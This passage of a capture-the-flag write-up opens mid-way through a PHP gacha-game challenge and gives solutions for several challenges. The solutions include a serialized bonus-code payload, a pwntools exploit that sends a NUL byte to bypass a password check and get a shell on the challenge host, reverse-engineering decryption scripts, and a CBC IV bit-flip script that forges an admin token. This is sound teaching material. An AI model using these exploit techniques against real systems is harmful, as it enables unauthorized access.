        $_SESSION["inventory"]["N"] += 1;
        return "N Common";
    }
}

$characterNames = [
    "UR" => "Legendary Guardian",
    "SSR" => "Super Hero",
    "SR" => "Elite Warrior",
    "R" => "Brave Soldier",
    "N" => "Novice Warrior"
];
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lime RANGER</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Lime RANGER</h1>
        </div>
        
        <div class="user-info">
            <div class="balance">
                <div class="balance-icon">💎</div>
                <div class="balance-info">
                    <span>Your Gems</span>
                    <strong><?=$_SESSION["balance"];?></strong>
                </div>
            </div>
            <div class="user-id">Player ID: <?=session_id();?></div>
        </div>
        
        <div class="inventory">
            <h3>Your Character Collection</h3>
            <div class="inventory-grid">
                <div class="inventory-item UR">
                    <h4>UR</h4>
                    <p><?=$_SESSION["inventory"]["UR"];?></p>
                    <small><?=$characterNames["UR"];?></small>
                    <div class="character-tooltip">Ultra rare character, rate: 0.1%</div>
                </div>
                <div class="inventory-item SSR">
                    <h4>SSR</h4>
                    <p><?=$_SESSION["inventory"]["SSR"];?></p>
                    <small><?=$characterNames["SSR"];?></small>
                    <div class="character-tooltip">Super rare character, rate: 0.3%</div>
                </div>
                <div class="inventory-item SR">
                    <h4>SR</h4>
                    <p><?=$_SESSION["inventory"]["SR"];?></p>
                    <small><?=$characterNames["SR"];?></small>
                    <div class="character-tooltip">Rare character, rate: 0.5%</div>
                </div>
                <div class="inventory-item R">
                    <h4>R</h4>
                    <p><?=$_SESSION["inventory"]["R"];?></p>
                    <small><?=$characterNames["R"];?></small>
                    <div class="character-tooltip">Advanced character, rate: 0.7%</div>
                </div>
                <div class="inventory-item N">
                    <h4>N</h4>
                    <p><?=$_SESSION["inventory"]["N"];?></p>
                    <small><?=$characterNames["N"];?></small>
                    <div class="character-tooltip">Common character, rate: 98.4%</div>
                </div>
            </div>
        </div>
        
        <form class="draw-buttons" method="GET">
            <button type="submit" name="draw1" class="draw-button">
                Single Draw
                <span class="draw-cost">Costs 40 gems</span>
            </button>
            <button type="submit" name="draw10" class="draw-button premium">
                5+1 Multi Draw
                <span class="draw-cost">Costs 200 gems</span>
            </button>
        </form>
        
        <form class="sellacc-container" method="GET">
            <button type="submit" name="sellacc" class="draw-button sellacc-button">
                Sell Account
            </button>
        </form>
        
        <div class="bonus-section">
            <h3>Event Rewards</h3>
            <p>Enter a reward code to claim extra characters</p>
            <form method="GET">
                <input type="text" name="bonus_code"size="80">
                <button type="submit">Claim Reward</button>
            </form>
        </div>
        
        <?php if($draw_result): ?>
        <div class="result">
            <h2>Draw Result</h2>
            <p><?=$draw_result;?></p>
        </div>
        <?php endif; ?>
        
        <div class="footer">
            <span>© 2025 Lime RANGER</span>
            <a href="?view" class="source-link">View Source</a>
        </div>
    </div>
    
    <script>
        function createSparkles() {
            const items = document.querySelectorAll('.inventory-item.UR, .inventory-item.SSR');
            items.forEach(item => {
                for(let i = 0; i < 3; i++){
                    const sparkle = document.createElement('div');
                    sparkle.classList.add('sparkle');
                    const posX = Math.random() * 100;
                    const posY = Math.random() * 100;
                    sparkle.style.left = `${posX}%`;
                    sparkle.style.top = `${posY}%`;
                    const size = 3 + Math.random() * 3;
                    sparkle.style.width = `${size}px`;
                    sparkle.style.height = `${size}px`;
                    const hue = item.classList.contains('UR') ? '45' : '210';
                    sparkle.style.background = `hsl(${hue}, 100%, 75%)`;
                    const duration = 1 + Math.random() * 2;
                    const delay = Math.random() * 2;
                    sparkle.style.animation = `sparkle ${duration}s infinite ${delay}s`;
                    item.appendChild(sparkle);
                }
            });
        }
        
        window.addEventListener('DOMContentLoaded', () => {
            createSparkles();
            const buttons = document.querySelectorAll('.draw-button');
            buttons.forEach(button => {
                button.addEventListener('click', function(){
                    this.style.transform = 'scale(0.95)';
                    setTimeout(() => {
                        this.style.transform = '';
                    }, 100);
                });
            });
        });
    </script>
</body>
</html>


Solve
```
Core point is `bonus_code`: by entering arbitrary content in the field, you see payload reflected in URL (`?bonus_code=a%3A2%3A%3A%2...........`).

Steps:
1. Prepare payload
Send a `bonus_code` so that:
```
$_SESSION["inventory"]["UR"] += ?;
$_SESSION["inventory"]["SSR"] += ?;
```
Goal: make UR+SSR >= 10

PHP: 
```
<?php
$payload = array("UR"=>5, "SSR"=>5);
echo urlencode(serialize($payload));
?>
```
This outputs:
```
a:2:{s:2:"UR";i:5;s:3:"SSR";i:5;}
```
Then pass this payload in URL parameter:
```
?bonus_code=a%3A2%3A%7Bs%3A2%3A%22UR%22%3Bi%3A5%3Bs%3A3%3A%22SSR%22%3Bi%3A5%3B%7D
```
Then visit sell page

**Flag: THJCC{lin3_r4nGeR_13_1ncreD!Ble_64m3?}**

## Insecure Shell

Hint: SSH is outdated, ISSH is a more convenient alternative (not sure what this hint is for)

chal.c: 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h> // for read()

void init()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

int check_password(char *a, char *b, int length)
{
    for (int i = 0; i < length; i++)
        if (a[i] != b[i])
            return 1;
    return 0;
}

int main()
{
    init();

    char password[0x10];
    char buf[0x10];

    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0)
    {
        printf("Error opening /dev/urandom. If you see this. call admin\n");
        return 1;
    }
    read(fd, password, 15);

    printf("Enter the password >");
    scanf("%15s", buf);

    if (check_password(password, buf, strlen(buf)))
        printf("Wrong password!\n");
    else
        system("/bin/sh");

    return 0;
}
```

* This program generates a random 15-byte password, asks for input, and runs `/bin/sh` on correct password; otherwise prints `Wrong password!`.
* Vulnerability: `password[15]` remains uninitialized. Only 15 bytes are read into a 16-byte array. Comparison length is `strlen(buf)`. If first input byte is `\0` (empty string), `strlen(buf)=0`, loop never runs, and check returns equal, bypassing auth.

exploit.py: 
```
from pwn import *
import os

# Switch local/remote
LOCAL = True

p = remote('chal.ctf.scint.org', 10004)

# 1) Wait for prompt
p.recvuntil(b'Enter the password >')

# 2) Send one NUL byte to bypass strlen-based comparison
#    sendline automatically appends '\n'
p.sendline(b'\x00')

# 3) Send cat flag.txt to get flag
p.sendline(b'cat flag.txt')

# 4) Read and print flag
flag = p.recvline(timeout=2).decode().strip()
print("FLAG:", flag)

p.interactive()
```
**Flag: THJCC{H0w_did_you_tyPE_\x00?}**

## time_GEM

Hint: I used the Time GEM to put the flag to sleep...

This challenge provides Linux ELF executable `envy`, which says the flag is asleep and must be awakened. In IDA, an encrypted string appears: `char enc[] = {`
  0x18, 0x2A, 0x19, 0x14, 0x2F, 0x17, ... // similar format
};
`
The decrypt function uses XOR plus offset and time-related logic; decrypted output is the flag.
* XOR logic roughly:
decrypted[i] = encrypted[i] ^ key[i % keylen]
* Strategy:
Since sleep happens after startup, `time(NULL)` is already fixed. Pause before sleep to get seed (or patch sleep and analyze directly).

Convert decryption logic into Python and plug in ciphertext plus fixed params to recover flag.
```
# Construct cipher list using list of offsets and values manually transcribed above:

# Total 67 bytes
offset_values = {
    0x2060:0x00,0x2064:0x01,0x2068:0x02,0x206C:0x03,0x2070:0x04,
    0x2074:0x37,0x2078:0x1D,0x207C:0x64,0x2080:0x30,0x2084:0x11,
    0x2088:0x0C,0x208C:0x1B,0x2090:0x2D,0x2094:0x2A,0x2098:0x15,
    0x209C:0x18,0x20A0:0x00,0x20A4:0x71,0x20A8:0x08,0x20AC:0x3F,
    0x20B0:0x0E,0x20B4:0x04,0x20B8:0x6B,0x20BC:0x63,0x20C0:0x17,
    0x20C4:0x67,0x20C8:0x49,0x20CC:0x5F,0x20D0:0x7C,0x20D4:0x19,
    0x20D8:0x65,0x20DC:0x6B,0x20E0:0x3A,0x20E4:0x37,0x20E8:0x1A,
    0x20EC:0x40,0x20F0:0x1E,0x20F4:0x2E,0x20F8:0x0D,0x20FC:0x37,
    0x2100:0x58,0x2104:0x2C,0x2108:0x52,0x210C:0x55,0x2110:0x3C,
    0x2114:0x12,0x2118:0x4A,0x211C:0x29,0x2120:0x42,0x2124:0x25,
    0x2128:0x4E,0x212C:0x1E,0x2130:0x2C,0x2134:0x40,0x2138:0x5E,
    0x213C:0x5B,0x2140:0x29,0x2144:0x5C,0x2148:0x5D,0x214C:0x46,
    0x2150:0x42,0x2154:0x5A,0x2158:0x50,0x215C:0x4D,0x2160:0x2E,
    0x2164:0x27,0x2168:0x70 
}

cipher = []
for i in range(67):
    offset = 0x2060 + 4*i
    cipher.append(offset_values[offset])

# key
key = b"THJCCISSOGOODIMNOTTHEFLAG!!!"

# decrypt
flag = ""
for i,c in enumerate(cipher):
    k = key[i % len(key)] ^ (i % 256)
    flag += chr(k ^ c)

print(flag)
```
**Flag: THJCC{H0w_I_enVY_4Nd_W15H_re4L17Y_k0uLd_4L50_k0N7R0l_TIME-->=.=!!!}**

## Flag Checker

Open provided `chal` in IDA and inspect key points in `main`:
* Input flag into `s`:
```
printf("flag >");
__isoc99_scanf("%255s", s);
```
User input goes into `s`, up to 255 chars (but `s` is only 8 bytes).
* Process each character:
```
for ( i = 0; i < strlen(s); ++i )
    s[i] = ((s[i] << (i & 7)) | (s[i] >> (-(char)i & 7))) ^ 0xF;
```
This is a rotate-left/right + XOR style transform.
`(i & 7)` is just `i % 8`.
`(-(char)i & 7)` is a trick equivalent to `(8 - (i % 8)) % 8`.
* Then pass to function `sub_11C9` for validation.

sub_11c9:
```
__int64 __fastcall sub_11C9(__int64 a1)
{
  signed int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; (unsigned int)i <= 0x20; i += 3 )
  {
    if ( *(unsigned __int8 *)(i + a1) + *(unsigned __int8 *)(i + 1LL + a1) != dword_4020[i] )
      return 0;
    if ( *(unsigned __int8 *)(i + 1LL + a1) + *(unsigned __int8 *)(i + 2LL + a1) != dword_4020[i + 1] )
      return 0;
    if ( *(unsigned __int8 *)(i + a1) + *(unsigned __int8 *)(i + 2LL + a1) != dword_4020[i + 2] )
      return 0;
  }
  return 1;
}
```
`sub_11C9` performs checksum-like checks: every **3 chars** form **3 sum constraints**, totaling 33 checked bytes. So `s` (or overflowed region) must provide at least 33 valid bytes. Then use `dword_4020` to reconstruct/decrypt those 33 bytes.

```
dword_4020 = [
    0xFA, 0xC5, 0x81, 0x50, 0x9B, 0x75, 0x72, 0x6D, 0xA5, 0xB5,
    0x100, 0xD1, 0x171, 0x1C1, 0x160, 0x13B, 0x163, 0x1A2, 0xF7,
    0x167, 0x184, 0x155, 0x174, 0x121, 0xD1, 0x8D, 0x80, 0x181,
    0x174, 0x1DD, 0x50, 0x0, 0x50
]

# Reconstruct encrypted `s`
s_enc = []

for i in range(0, 33, 3):
    d0 = dword_4020[i]
    d1 = dword_4020[i+1]
    d2 = dword_4020[i+2]

    x = (d0 - d1 + d2) // 2
    y = d0 - x
    z = d1 - y

    s_enc.extend([x, y, z])

# Recover original input (before encryption)
def decrypt_byte(b, i):
    b ^= 0xF
    b = ((b >> (i & 7)) | (b << (8 - (i & 7)))) & 0xFF
    return b

flag = ''.join(chr(decrypt_byte(b, i)) for i, b in enumerate(s_enc))

print(f"[+] Flag: {flag}")
```
**Flag: THJCC{i$_&_0x7_equaL_to_m0D_8?}**

## Setsuna Message

Message: 
```
D'`A@^8!}}Y32DC/eR,>=/('9JIkFh~ffAAca=+u)\[qpun4lTpih.lNdihg`_%]E[Z_X|\>ZSwQVONr54PINGkEJCHG@d'&BA@?8\<|43Wx05.R,10/('Kl$)"!E%e{z@~}v<z\rqvutm3Tpihmf,dLhgf_%FE[`_X]Vz=YXQPta
```
Hint1: Some things will not succeed if you just observe them. You need to execute them so that they can lead you to the final path.

Hint2: Having said that, his level of chaos is beyond imagination. Although it is not as exaggerated as the 18th level of hell, it can be regarded as the 8th level of hell.

From hints, this is likely executable code, and Malbolge best fits due to its notorious difficulty (“8th level of hell”). Running it on [Malbolge online](https://www.tutorialspoint.com/compilers/online-malbolge-compiler.htm) outputs `VEhKQ0N7QHIhc3UhMXl9`, which base64-decodes to the flag.
**Flag: THJCC{@r!su!1y}**

## Yoshino's Secret

This challenge provides an authentication system using AES-CBC.
chal.py:
```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from secret import FLAG
import json
import os

KEY = os.urandom(16)  # randomly generated 16-byte AES key

def encrypt(plaintext: bytes) -> bytes:
    iv = plaintext[:16]  # use first 16 plaintext bytes as IV
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext[16:], AES.block_size))

def decrypt(ciphertext: bytes) -> str:
    iv = ciphertext[:16]  # use first 16 ciphertext bytes as IV
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
    return plaintext

def check(token):
    try:
        token = bytes.fromhex(token)
        passkey = decrypt(token)
        data = json.loads(passkey)
        if data["admin"]:  # if admin is true, output FLAG
            print(f"Here is your flag: {FLAG}")
            exit()
        else:
            print("Access Denied")
    except:
        print("Hacker detected, emergency shutdown of the system")
        exit()

def main():
    passkey = b'{"admin":false,"id":"TomotakeYoshino"}'  # default admin is false
    token = encrypt(os.urandom(16) + passkey)  # generate token
    print(f"token: {token.hex()}")
    while True:
        token = input("token > ")
        check(token)
```
* Attack strategy:
Goal is to flip `"admin":false` to `"admin":true ` (note trailing space to preserve length). Using CBC properties, modify IV (first 16 token bytes) to control decrypted plaintext bytes via XOR.
* Practical attack steps
Get original token
Convert from hex to bytes
Split IV (first 16 bytes) and ciphertext (rest)
Locate `false` in plaintext
Modify corresponding IV bytes via XOR so decrypted `false` becomes `true `

Solve script:
```
# First run original program to get a token
# Assume received token is hex string

# Then do the following
import binascii

def solve(original_token_hex):
    # 1. Convert token hex to bytes
    token = bytes.fromhex(original_token_hex)
    
    # 2. Split IV and ciphertext
    iv = bytearray(token[:16])
    ciphertext = token[16:]
    
    # 3. Decrypted plaintext is {"admin":false,"id":"TomotakeYoshino"}
    # Need to change "false" to "true "
    # Determine position of "false" in first block
    # Assume "admin":false is within first 16 plaintext bytes
    # Starting from {"admin":f, false starts around byte 10
    
    # Positions to modify
    positions = {
        9: ord('f') ^ ord('t'),  # change f -> t
        10: ord('a') ^ ord('r'),  # change a -> r
        11: ord('l') ^ ord('u'),  # change l -> u
        12: ord('s') ^ ord('e'),  # change s -> e
        13: ord('e') ^ ord(' ')   # change e -> space
    }
    
    # 4. Bit-flip in IV
    for pos, xor_val in positions.items():
        iv[pos] ^= xor_val
    
    # 5. Combine modified IV with original ciphertext
    modified_token = bytes(iv) + ciphertext
    
    # 6. Convert back to hex
    return modified_token.hex()

# Token obtained from program
# Run program and copy output token
original_token = input("Enter original token: ")

# Generate modified token
modified_token = solve(original_token)
print("Modified token:")
print(modified_token)
```
**Flag: THJCC{F1iP_Ou7_y0$Hino's_53Cr3t}**

## Hidden in memory...
Hint: Find the computer name and submit with THJCC{computername}

After downloading `memdump.rar` and extracting `memdump.dmp`, run `!PEB` as instructed to get `COMPUTERNAME=WH3R3-Y0U-G3TM3`

**Flag: THJCC{WH3R3-Y0U-G3TM3}**